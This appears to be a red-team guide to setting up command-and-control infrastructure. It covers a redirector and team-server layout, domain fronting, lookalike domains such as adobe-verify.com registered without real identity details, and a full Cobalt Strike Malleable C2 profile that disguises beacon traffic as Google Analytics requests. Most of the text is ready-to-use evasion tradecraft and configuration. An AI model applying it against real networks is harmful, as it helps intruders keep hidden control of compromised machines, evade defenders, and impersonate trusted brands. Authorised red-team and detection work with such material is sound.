# ===== C2 INFRASTRUCTURE SETUP =====
# Setting up a professional red team C2 infrastructure

"""

RED TEAM INFRASTRUCTURE LAYOUT:

         Internet
            |
      +-----+------+
      |            |
   Redirector    Redirector (backup)
      |            |
      +-----+------+
            |
       Team Server
       (C2 Backend)
       (isolated, no direct internet)
            |
      +-----+------+
      |            |
   Operator 1   Operator 2


COMPONENTS:
1. Team Server: The main C2 backend (Cobalt Strike, Sliver, Mythic)
2. Redirectors: Public-facing machines that forward traffic to the team server
   - Apache/Nginx reverse proxy with SSL
   - Domain fronting (using CDN like Cloudflare)
   - Multiple redirectors for redundancy
3. Domain Names:
   - Look legitimate (update-notification.com, adobe-verify.com)
   - Auto-renew with privacy protection
   - Don't use your real info for registration
4. SSL Certificates:
   - Let's Encrypt for free
5. Profiles:
   - C2 profile (Malleable C2 for Cobalt Strike)
   - Defines how traffic looks on the wire
   - Mimics legitimate services (like Google Analytics API)
"""

# ===== C2 PROFILE EXAMPLE (Cobalt Strike Malleable C2) =====
"""
# myprofile.profile - This makes C2 traffic look like Google Analytics

set sample_name "My C2 Profile";
set sleeptime "45000";  # 45 second check-in interval
set jitter "20";        # 20% jitter (so intervals are 36-54 seconds)
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/analytics.js";
    client {
        header "Accept" "*/*";
        metadata {
            prepend "session=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "application/javascript";
        output {
            prepend "/* ";
            append " */";
            print;
        }
    }
}

http-post {
    set uri "/collect";
    client {
        header "Content-Type" "application/json";
        id {
            parameter "tid";
        }
        output {
            prepend "{";
            append "}";
            print;
        }
    }
    server {
        header "Content-Type" "application/json";
        output {
            print;
        }
    }
}
"""

